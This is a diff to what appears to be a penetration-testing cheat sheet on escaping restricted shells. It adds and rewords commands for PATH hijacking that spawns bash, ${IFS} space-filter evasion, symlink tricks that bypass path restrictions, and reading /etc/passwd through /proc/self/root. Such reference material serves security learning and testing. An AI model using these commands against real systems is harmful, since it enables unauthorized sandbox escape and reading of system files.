@@ -39,7 +39,7 @@ chmod +x /tmp/bin/ls
 export PATH=/tmp/bin:$PATH
 ls  # spawns bash
 
-# Alternative if writable dir but can't write files
+# Alternative: if you can only set PATH (no file write anywhere), just point it at real system dirs
 export PATH=/bin:/usr/bin:$PATH
 ```
 
@@ -85,9 +85,13 @@ ls${IFS}-la${IFS}/etc
 ## 🔗 Symlink & Procfs Hijacking
 
 ```bash
-# Bypass path restrictions
+# Bypass path restrictions (filters often block a literal leading "/")
 ln -s / tmp_link
 cd tmp_link/etc/
+
+# /proc/self/root is also a symlink to / - same trick, no setup needed
+cd /proc/self/root/etc
+cat /proc/self/root/etc/passwd
 
 # Find exposed links
 find / -type l -exec readlink -f {} \; 2>/dev/null
